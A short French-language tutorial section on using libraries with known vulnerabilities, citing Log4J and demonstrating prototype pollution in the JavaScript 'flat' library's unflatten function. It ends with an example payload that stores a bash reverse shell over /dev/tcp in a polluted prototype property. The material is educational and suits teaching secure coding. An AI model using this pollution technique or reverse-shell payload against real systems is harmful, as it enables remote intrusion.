# 4. Utilisation de librairies avec des vulnérabilités connues

A force d'utiliser des librairies dans nos projets, il peut parfois
arriver qu'une petite faille de sécurité se glisse avec.

On peut noter une faille assez récente (2021), Log4J (CVE-2021-44228)

Cette faille dans Log4J permettait à n'importe qui, qui pouvait controler les logs d'une application, d'éxécuter du code arbitraire.

## Exemple de Prototype Pollution avec la librairie JS `flat`

Sur la version `5.0.0` de la librairie `flat` a été repéré une faille qui permet d'insérer des valeurs dans le prototype JS `__proto__`, ou `global.__proto__`, en utilisant la fonction `unflatten` de la librairie.

### Le principe de la librairie

On passe un paramètre qui permet de transformer un string en un objet.

```javascript
import { unflatten } from 'flat'

unflatten({
    'three.levels.deep': 42,
    'three.levels': {
        nested: true
    }
})

// {
//     three: {
//         levels: {
//             deep: 42,
//             nested: true
//         }
//     }
// }
```

### La vulnérabilité

Cependant, lorsque l'on passe `__proto__`, on va directement intéragir avec le `prototype`.

```javascript
const unflatten = require("flat").unflatten;

unflatten({
    "__proto__.polluted": true
});

console.log(polluted); // true
```

Ainsi, on peut modifier des variables globales et même redéfinir des fonctions !

Un reverse shell pourrait être

```javascript
unflatten({
    "__proto__.someVariable": 'require("child_process").exec("bash -c \'bash -i>& /dev/tcp/127.0.0.1/6666 0>&1\'");'
});
```
